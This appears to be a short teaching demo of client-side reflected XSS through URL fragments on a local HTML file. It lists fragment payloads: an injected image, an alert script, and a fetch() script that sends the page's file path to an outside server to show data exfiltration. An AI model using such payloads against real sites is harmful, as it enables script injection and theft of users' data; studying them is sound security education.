Client side reflected XSS. Using fragments.

File in use: secret_location_ex1.html

Directly open file in Chrome: Ctrl + O

You'll be visiting something like: file:///home/sahil/secret_location_ex1.html
Enter fragment and refresh to use.
For example: file:///home/sahil/secret_location_ex1.html#blah

-------------------

Show usage of following fragments:

Simple usage:
	#blah

Load arbitrary images:
	#<img%20src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">

Pop up alert box:
	#<script>alert(1)</script>

Leak secret location of our file to external server. Main motive is to show how to ex-filtrate data:
	#<script>fetch('https://sahilsihag.github.io?secret='+location.pathname)</script>
	
	Here you can show outgoing network request from "Networks" tab in dev tools. Unfortunately, I don't have a running webserver where I can show the filename being received by the server.
